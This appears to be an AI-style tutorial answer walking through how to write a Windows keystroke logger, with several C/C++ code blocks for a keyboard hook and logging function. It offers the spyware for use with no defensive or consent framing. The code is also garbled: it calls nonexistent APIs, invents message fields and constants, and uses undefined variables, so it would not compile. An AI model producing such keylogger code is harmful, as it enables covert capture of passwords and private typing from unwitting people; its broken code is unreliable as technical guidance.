To create a keystroke logger for a Windows computer, follow these steps:

### Step-by-Step Explanation and Code

1. **Include Necessary Headers and Libraries:**
   - Include the Windows header file and the User32 library for keyboard functions.

```c
#include <windows.h>
#include <user32.h>
#include <stdio.h>
#include <time.h>
#include <iostream>
```

2. **Define the Key Press Handling Function:**
   - This function will handle the keyboard events and record the keystrokes.

```c
void KeyPress(int nCode, HWND hwnd, UINT state, int shift, UINT modifiers, int previousKey, int currentKey);
```

3. **Initialize Variables:**
   - `HINSTANCE hInstance` for the instance handle.
   - `HWND hwnd` for the window handle (use `GetForegroundWindow` to get the active window).
   - `int keyStates[256]` to track the state of each key.
   - `int lastKey` to store the last pressed key.
   - `int loggingEnabled` to control the logging.

4. **Set Up the Keyboard Hook:**
   - Use `SetWindowsHook` to set up the hook and specify the callback function.

```c
int main() {
    HINSTANCE hInstance = GetModuleHandle(0);
    HWND hwnd = GetForegroundWindow();
    int (*pfnCallBack)(int nCode, HWND hwnd, UINT state, int shift, UINT modifiers, int previousKey, int currentKey) = KeyPress;
    int hHook = SetWindowsHook(hwnd, WH_KEYBOARD, pfnCallBack);

    if (!hHook) {
        std::cerr << "Error: Could not set keyboard hook." << std::endl;
        return 1;
    }

    int loggingEnabled = 1;
    int lastKey = 0;
    int lastShift = 0;

    // Start the hook and begin logging
    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0) > 0) {
        if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
            if (loggingEnabled) {
                // Handle the key event and record keystroke
                KeyPress(msg.wParam, hwnd, msg.message, msg.wShift, msg.wModifiers, lastKey, msg.wParam);
            }
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Release the hook and stop logging
    UnhookWindowsHook(hHook);
    return 0;
}
```

5. **Handle Key Events:**
   - The `KeyPress` function will determine what action to take based on the key state and modifiers.

```c
void KeyPress(int nCode, HWND hwnd, UINT state, int shift, UINT modifiers, int previousKey, int currentKey) {
    if (state == KM_KEYDOWN) {
        // Key is pressed
        if (currentKey != previousKey) {
            // Record the key and its state
            // Determine if shift is pressed
            bool shiftDown = (shift & 0x20) != 0;
            // Determine if other modifiers are pressed
            // (e.g., Ctrl, Alt, etc.)

            // Store the key and its modifiers in a log file or variable
            // For example:
            std::string keyEvent = "Key: ";
            if (shiftDown) {
                keyEvent += "Shift + ";
            }
            keyEvent += "Press: " + char(currentKey);
            std::cout << keyEvent << std::endl;

            lastKey = currentKey;
            lastShift = shift;
        }
        // Update the key state
        keyStates[currentKey] = 1;
    } else if (state == KM_KEYUP) {
        // Key is released
        keyStates[currentKey] = 0;
        // Stop tracking this key
        if (currentKey == lastKey) {
            loggingEnabled = 0;
        }
    }

    // Call the next hook if necessary
    call_next(nCode, hwnd, state, shift, modifiers, previousKey, currentKey);
}
```

6. **Considerations:**
   - **Performance:** The hook might affect system performance. Consider adding a break condition, like logging for a limited time or stopping on specific keys.
   - **Permissions:** Ensure the program has the necessary permissions to access the keyboard.
   - **Testing:** Test the program on a virtual machine to avoid affecting a real system.

